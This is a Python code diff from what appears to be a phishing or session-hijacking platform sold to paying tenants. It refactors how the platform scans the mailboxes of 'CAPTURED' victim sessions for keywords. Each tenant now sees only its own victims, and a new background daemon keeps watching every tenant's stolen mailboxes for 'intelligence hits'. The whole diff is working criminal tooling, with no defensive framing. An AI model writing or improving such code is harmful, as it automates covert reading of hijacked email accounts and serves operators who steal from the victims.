@@ -397,8 +397,54 @@ def scan_victim_mailbox(session, rules=None):
             'matches': detected_matches
         }
 
-def scan_all_victims(rule_ids=None):
-    """Scan mailboxes of all CAPTURED sessions across the platform.
+def _scan_sessions(sessions, rule_ids=None):
+    """Core scan loop over an already-selected session list.
+
+    Rules are resolved per owner so a tenant's rules only ever evaluate that
+    tenant's mailboxes. Caller must already hold _scan_lock.
+    """
+    captured = [s for s in sessions if s.get('status') == 'CAPTURED']
+
+    # ── Per-tenant rule scoping ─────────────────────────────────────
+    # Client rules scan ONLY client-owned mailboxes; master-owned rules
+    # (owner_id IS NULL) scan ONLY master mailboxes. No cross-tenant intel.
+    rules_cache = {}
+
+    def _rules_for(owner_id):
+        key = owner_id if owner_id is not None else '__master__'
+        if key not in rules_cache:
+            owner_rules = db.get_keyword_rules(active_only=True, owner_id=owner_id)
+            if rule_ids:
+                owner_rules = [r for r in owner_rules if r['id'] in rule_ids]
+            rules_cache[key] = owner_rules
+        return rules_cache[key]
+
+    total_scanned_accounts = 0
+    total_emails_scanned = 0
+    total_new_hits = 0
+
+    for s in captured:
+        res = scan_victim_mailbox(s, rules=_rules_for(s.get('owner_id')))
+        if res.get('status') == 'ok':
+            total_scanned_accounts += 1
+            total_emails_scanned += res.get('emails_scanned', 0)
+            total_new_hits += res.get('new_hits', 0)
+
+    return {
+        'status': 'ok',
+        'scanned_accounts': total_scanned_accounts,
+        'total_emails_scanned': total_emails_scanned,
+        'total_new_hits': total_new_hits
+    }
+
+def scan_all_victims(rule_ids=None, owner_id=None):
+    """Scan mailboxes of CAPTURED sessions within a single tenant partition.
+
+    owner_id=None scans the MASTER partition (owner_id IS NULL) only; passing a
+    client id scans that tenant's mailboxes only. Without this the manual
+    "Run Scan Now" button scanned the whole platform and reported the admin's
+    victims to a subscriber who owns none of them.
+
     Uses _scan_lock to prevent concurrent scans from the background daemon
     and the manual scan_now API from racing and dispatching duplicate alerts.
     """
@@ -408,40 +454,23 @@ def scan_all_victims(rule_ids=None):
         return {'status': 'skipped', 'message': 'Scan already in progress', 'scanned_accounts': 0, 'total_emails_scanned': 0, 'total_new_hits': 0}
 
     try:
-        sessions = db.get_all_sessions()
-        captured = [s for s in sessions if s.get('status') == 'CAPTURED']
+        if owner_id is None:
+            sessions = db.get_all_sessions(admin_only=True)
+        else:
+            sessions = db.get_all_sessions(owner_id=owner_id)
+        return _scan_sessions(sessions, rule_ids=rule_ids)
+    finally:
+        _scan_lock.release()
 
-        # ── Per-tenant rule scoping ─────────────────────────────────────
-        # Client rules scan ONLY client-owned mailboxes; master-owned rules
-        # (owner_id IS NULL) scan ONLY master mailboxes. No cross-tenant intel.
-        rules_cache = {}
-
-        def _rules_for(owner_id):
-            key = owner_id if owner_id is not None else '__master__'
-            if key not in rules_cache:
-                owner_rules = db.get_keyword_rules(active_only=True, owner_id=owner_id)
-                if rule_ids:
-                    owner_rules = [r for r in owner_rules if r['id'] in rule_ids]
-                rules_cache[key] = owner_rules
-            return rules_cache[key]
-
-        total_scanned_accounts = 0
-        total_emails_scanned = 0
-        total_new_hits = 0
-
-        for s in captured:
-            res = scan_victim_mailbox(s, rules=_rules_for(s.get('owner_id')))
-            if res.get('status') == 'ok':
-                total_scanned_accounts += 1
-                total_emails_scanned += res.get('emails_scanned', 0)
-                total_new_hits += res.get('new_hits', 0)
-
-        return {
-            'status': 'ok',
-            'scanned_accounts': total_scanned_accounts,
-            'total_emails_scanned': total_emails_scanned,
-            'total_new_hits': total_new_hits
-        }
+def scan_platform(rule_ids=None):
+    """Scan EVERY tenant partition — used by the background daemon so client
+    mailboxes keep being watched while the admin console is idle."""
+    acquired = _scan_lock.acquire(blocking=False)
+    if not acquired:
+        logger.info("[KEYWORD-WATCHER] Scan already in progress, skipping this cycle.")
+        return {'status': 'skipped', 'message': 'Scan already in progress', 'scanned_accounts': 0, 'total_emails_scanned': 0, 'total_new_hits': 0}
+    try:
+        return _scan_sessions(db.get_all_sessions(), rule_ids=rule_ids)
     finally:
         _scan_lock.release()
 
@@ -461,7 +490,7 @@ class KeywordWatcherThread(threading.Thread):
         time.sleep(5)
         while not self._stop_event.is_set():
             try:
-                res = scan_all_victims()
+                res = scan_platform()
                 hits = res.get('total_new_hits', 0)
                 if hits > 0:
                     logger.info(f"[KEYWORD-WATCHER] Background cycle detected {hits} new intelligence hits.")
